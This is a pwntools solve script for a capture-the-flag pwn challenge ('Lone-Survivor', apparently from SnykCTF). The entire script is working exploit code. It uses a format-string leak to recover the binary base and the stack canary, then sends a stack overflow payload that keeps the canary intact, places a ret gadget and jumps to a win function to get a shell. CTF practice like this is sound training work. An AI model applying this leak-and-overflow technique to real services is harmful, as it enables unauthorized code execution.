#!/usr/bin/env python3

from pwn import *

PATH = "/home/spinel99/CTFs/Author/HackingHub/SnykCTF/pwn/Lone-Survivor/solve/chall"

exe = context.binary = ELF(PATH, checksec=False)

if args.REMOTE:
    HOST = "localhost"
    PORT = 10001
    p = remote(HOST, PORT)
else:
    p = process(PATH)
    if args.GDB:
        GDB_SCRIPT = \
"""
b *$rebase(0x140E)
b *$rebase(0x1532)
b *$rebase(0x15E9)
c
"""
        gdb.attach(p, gdbscript=GDB_SCRIPT)

s = b''
s += b'%25$p%21$p'
p.sendlineafter(b'O Wanderer of the Wastes: ', s)
p.recvuntil(b'Hail to thee, ')

leak = p.recvuntil(b'Keeper of the Final Hope!\n\n', drop=True)
l0, l1 = leak[2:].split(b'0x')
exe.address = int(l0, 16) - exe.sym['main']
canary = int(l1, 16)

print(f'exe.address: {hex(exe.address)}')
print(f'Canary: {hex(canary)}')

rop = ROP(exe)

p.sendlineafter(b'Thy decree: ', b'1')
s = b''
s += b'A' * cyclic_find(0x616161616161616a, n=8) # Padding
s += p64(canary)            # Canary
s += p64(0)                 #Â Saved RBP
s += p64(rop.ret.address)   # For `system()` 16-bytes alignment
s += p64(exe.sym.win)
p.sendlineafter(b'Inscribe thy instrument of salvation: ', s)

p.sendlineafter(b'Thy decree: ', b'2')
p.recvuntil(b" 'Tis done.\n")

p.sendlineafter(b'Thy decree: ', b'3')

p.recvuntil(b'May the ancients guide thy aim...\n\n')

p.interactive()